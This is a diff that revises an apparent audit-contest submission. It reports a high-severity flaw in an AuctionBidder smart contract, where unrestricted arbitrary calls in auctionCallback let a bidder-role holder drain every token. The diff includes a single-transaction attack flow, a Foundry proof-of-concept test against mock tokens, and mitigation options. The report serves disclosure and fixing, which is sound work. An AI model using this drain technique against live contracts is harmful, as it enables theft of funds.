@@ -1,120 +1,148 @@
-# C4 Submission Form
+Severity rating *
+High severity
 
-## Severity rating
+Title *
+Unguarded _multiCall in auctionCallback enables single-tx drain of all AuctionBidder token balances via arbitrary external call
 
-High
+Links to root cause *
 
-## Title
+https://github.com/code-423n4/2026-03-chainlink/blob/main/src/AuctionBidder.sol#L97-L112
 
-Unrestricted arbitrary call execution in `auctionCallback` allows AUCTION_BIDDER_ROLE to drain all contract funds via crafted `Call[]` payload
+https://github.com/code-423n4/2026-03-chainlink/blob/main/src/Caller.sol#L49-L62
 
-## Links to root cause
-
-```
-https://github.com/code-423n4/2026-03-chainlink/blob/main/src/AuctionBidder.sol#L97
-https://github.com/code-423n4/2026-03-chainlink/blob/main/src/Caller.sol#L58
-```
-
-## Vulnerability details
-
----COPY FROM HERE---
+Vulnerability details *
 
 ## Finding description and impact
 
-`AuctionBidder.auctionCallback()` ([L97-112](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/AuctionBidder.sol#L97)) decodes caller-supplied `Call[]` from the `data` parameter and passes it verbatim to `_multiCall()` ([Caller.sol L58-60](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/Caller.sol#L58)), which executes each `Call` via raw low-level `.call(data)` with **no restriction on target address or calldata selector**.
+### Root Cause
+
+`Caller._multiCall()` ([L49-62](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/Caller.sol#L49-L62)) performs a raw `.call()` for every element in its `Call[]` array with no validation on target or selector:
 
 ```solidity
-// AuctionBidder.sol L97-112
-function auctionCallback(uint256 amountOut, bytes calldata data) external override {
-    // ... auction validation ...
-    Call[] memory calls = abi.decode(data, (Call[]));
-    _multiCall(calls);  // ← unrestricted arbitrary execution
+// Caller.sol L55-59
+for (uint256 i; i < calls.length; ++i) {
+    (bool success, bytes memory result) = calls[i].target.call(calls[i].data);
     // ...
-}
-
-// Caller.sol L58-60
-function _multiCall(Call[] memory calls) internal {
-    for (uint256 i; i < calls.length; ++i) {
-        (bool success,) = calls[i].target.call(calls[i].data); // ← no target/selector restriction
-        // ...
-    }
 }
 ```
 
-The `withdraw()` function requires `DEFAULT_ADMIN_ROLE`, confirming that arbitrary token transfers were never intended for `AUCTION_BIDDER_ROLE` holders. However, `_multiCall` bypasses this separation of privilege entirely.
+`AuctionBidder.auctionCallback()` ([L97-112](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/AuctionBidder.sol#L97-L112)) `abi.decode`s the user-supplied `data` into `Call[]` and passes it directly to `_multiCall`:
+
+```solidity
+// AuctionBidder.sol L105-109
+Call[] memory calls = abi.decode(data, (Call[]));
+_multiCall(calls);   // ← attacker-controlled targets + calldata execute here
+```
+
+The entire call sequence runs as `AuctionBidder`, so any external call made by `_multiCall` executes with the bidder contract as `msg.sender`. This means `ERC20.transfer()` moves tokens **from** the bidder contract's own balance.
+
+### Privilege Escalation
+
+The protocol draws a clear access control boundary:
+
+- **`withdraw()`** → gated by `DEFAULT_ADMIN_ROLE` → only admins can extract tokens
+- **`bid()` / `auctionCallback()`** → gated by `AUCTION_BIDDER_ROLE` → intended for auction participation only
+
+`_multiCall` breaks this boundary: a bidder-role holder can execute `transfer(attacker, balance)` as the bidder contract, achieving the same result as `withdraw()` without admin privileges.
+
+### Attack Flow (single transaction)
+
+```
+attacker.bid(asset, amount, maliciousSolution)
+  └─ BaseAuction.bid()
+       └─ auctionCallback(amountOut, data)
+            └─ _multiCall([
+                 Call(target: LINK, data: transfer(attacker, LINK.balanceOf(self)))
+               ])
+            └─ LINK.transfer executes as AuctionBidder → funds sent to attacker
+            └─ forceApprove(auction, amountOut) ← too late, tokens already gone
+```
+
+The drain completes within `auctionCallback` **before** the auction can pull `assetOut`. Unlike the `approve()` variant (which requires a second transaction), this is a single-tx, atomic fund extraction.
 
 ### Impact
 
-An `AUCTION_BIDDER_ROLE` holder can construct a `solution` containing `Call({target: tokenAddress, data: transfer(attacker, balance)})`, draining **all tokens** held by the `AuctionBidder` contract. This constitutes direct theft of funds.
+Direct theft of all ERC20 tokens held by `AuctionBidder`. The contract accumulates balances across auction cycles as it bids on behalf of the protocol. A single malicious `bid()` call drains the entire balance of any targeted token.
 
-While `AUCTION_BIDDER_ROLE` is admin-granted (not permissionless), in practice this role is given to automated solver bots — a compromised or malicious bot can exploit this immediately. The `withdraw()` admin-only pattern proves the protocol intended to restrict token movements to admins only.
+Per C4 severity criteria: *"Assets can be stolen/lost/compromised directly."* This meets High because exploitation requires only `AUCTION_BIDDER_ROLE` — an operational role assigned to automated solver bots. A single compromised or malicious bot can drain all funds in one transaction. Not Critical because the role is admin-granted, not permissionless.
 
-## Proof of Concept
+## Proof of Concept (PoC)
 
 ```solidity
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.24;
+pragma solidity 0.8.26;
 
-import "forge-std/Test.sol";
+/**
+ * C-01 PoC: Single-tx drain via arbitrary _multiCall
+ * Run: forge test --match-test testC01_DirectDrainViaMultiCall -vvvv
+ * Place this file in test/poc/ alongside C4PoC.t.sol
+ */
+import {C4PoC} from "test/poc/C4PoC.t.sol";
+import {Caller} from "src/Caller.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
+import {console2} from "forge-std/console2.sol";
 
-interface IAuctionBidder {
-    function bid(address asset, uint128 amount, bytes calldata solution) external;
-}
+contract C01_PoC is C4PoC {
 
-interface ICaller {
-    struct Call {
-        address target;
-        bytes data;
-    }
-}
+    function testC01_DirectDrainViaMultiCall() public {
+        // --- Setup: start a USDC auction and seed AuctionBidder ---
+        uint256 auctionSellAmt = 2_000e6;
+        _startAuctionAndSkip(address(mockUSDC), auctionSellAmt, 7_200);
 
-contract C01_ArbitraryCallDrain is Test {
-    // Attacker with AUCTION_BIDDER_ROLE constructs malicious solution
-    function test_drainViaAuctionCallback() public {
-        // 1. Encode a transfer call targeting the held token
-        ICaller.Call[] memory maliciousCalls = new ICaller.Call[](1);
-        maliciousCalls[0] = ICaller.Call({
-            target: address(0xTOKEN),  // any ERC20 held by AuctionBidder
-            data: abi.encodeWithSignature(
-                "transfer(address,uint256)",
-                address(0xATTACKER),
-                1000 ether  // entire balance
+        uint256 linkNeeded   = _getAssetOutAmount(address(mockUSDC), auctionSellAmt);
+        uint256 linkReserve  = 10_000e18;   // accumulated LINK from prior auctions
+        _fundBidder(linkNeeded + linkReserve);
+
+        uint256 bidderBal  = mockLINK.balanceOf(address(auctionBidder));
+        uint256 attackerBal = mockLINK.balanceOf(attacker);
+        console2.log("Bidder LINK before (wei):", bidderBal);
+
+        // --- Exploit: inject transfer(attacker, balance) into solution ---
+        // _multiCall runs as AuctionBidder, so transfer() sends from bidder
+        uint256 drainAmount = mockLINK.balanceOf(address(auctionBidder));
+        Caller.Call[] memory drainCalls = new Caller.Call[](1);
+        drainCalls[0] = Caller.Call({
+            target: address(mockLINK),
+            data: abi.encodeWithSelector(
+                IERC20.transfer.selector,
+                attacker,
+                drainAmount
             )
         });
 
-        bytes memory solution = abi.encode(maliciousCalls);
+        // attacker holds AUCTION_BIDDER_ROLE (see C4PoC.setUp())
+        _bidWithSolution(address(mockUSDC), auctionSellAmt, drainCalls);
 
-        // 2. Call bid() — auction transfers assetIn to AuctionBidder,
-        //    then invokes auctionCallback which executes _multiCall
-        //    with the attacker's crafted calls, draining the contract
-        // IAuctionBidder(auctionBidder).bid(asset, amount, solution);
+        // --- Verify: AuctionBidder is empty, attacker got everything ---
+        uint256 bidderAfter   = mockLINK.balanceOf(address(auctionBidder));
+        uint256 attackerAfter = mockLINK.balanceOf(attacker);
 
-        // 3. Result: all tokens transferred to attacker BEFORE
-        //    auction can pull assetOut
+        assertEq(bidderAfter, 0, "AuctionBidder must be fully drained");
+        assertGt(attackerAfter - attackerBal, linkReserve, "attacker received reserve LINK");
+
+        console2.log("Bidder LINK after:", bidderAfter);
+        console2.log("Attacker gained (wei):", attackerAfter - attackerBal);
+        console2.log("[CONFIRMED] Single-tx drain successful");
     }
 }
 ```
 
-## Recommended mitigation
+## Recommended mitigation steps
 
-Restrict `_multiCall` targets and selectors within `auctionCallback`:
+**Option A (simplest — target allowlist):**
 
 ```solidity
-function auctionCallback(uint256 amountOut, bytes calldata data) external override {
+function auctionCallback(uint256 amountOut, bytes calldata data) external override whenNotPaused {
+    ...
     Call[] memory calls = abi.decode(data, (Call[]));
-
-    // Option A: Whitelist allowed targets
-    for (uint256 i; i < calls.length; ++i) {
-        require(
-            calls[i].target == address(s_auction) || s_allowedRouters[calls[i].target],
-            "Unauthorized target"
-        );
+    for (uint256 i = 0; i < calls.length; ++i) {
+        require(s_allowedSwapTargets[calls[i].target], "Unauthorized call target");
     }
     _multiCall(calls);
-    // ...
+    ...
 }
 ```
 
-Alternatively, replace arbitrary `_multiCall` with a dedicated swap executor that constrains both targets and function selectors.
+**Option B (strongest — remove arbitrary calls):** Replace `_multiCall` in `auctionCallback` with a purpose-built swap function that hardcodes the DEX interaction (e.g., `_executeSwap(router, tokenIn, tokenOut, amount)`) and cannot be repurposed for arbitrary calls.
 
----END COPY HERE---
+**Option C (defense-in-depth):** If `_multiCall` must stay, apply both a target allowlist and a selector denylist blocking `transfer`, `transferFrom`, and `approve` on any ERC20 target.
